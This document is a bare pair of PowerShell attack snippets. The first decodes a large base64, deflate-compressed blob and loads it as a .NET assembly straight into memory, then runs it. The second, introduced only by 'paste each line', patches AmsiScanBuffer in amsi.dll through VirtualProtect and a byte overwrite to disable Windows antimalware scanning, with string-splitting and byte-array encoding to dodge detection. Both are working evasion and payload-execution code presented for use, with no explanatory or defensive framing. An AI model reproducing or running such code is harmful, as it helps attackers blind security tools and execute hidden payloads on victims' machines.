sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null

paste each line

$thing = "using System;`n"
$thing = $thing + "using System.Runt" + "ime.InteropServices;`n"
$thing = $thing + "public class thing {`n"
$thing = $thing + "[DllImport(`"kernel32`")]`n"
$thing = $thing + "public static extern IntPtr GetPro" + "cAddress(IntPtr hModule, string procName);`n"
$thing = $thing + "[DllImport(`"kernel32`")]`n"
$thing = $thing + "public static extern IntPtr Load" + "Library(string name);`n"
$thing = $thing + "[DllImport(`"kernel32`")]`n"
$thing = $thing + "public static extern bool Virtual" + "Protect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);`n"
$thing = $thing + "}`n"

Add-Type $thing
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$Load = [thing]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [thing]::GetProcAddress($Load, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[thing]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
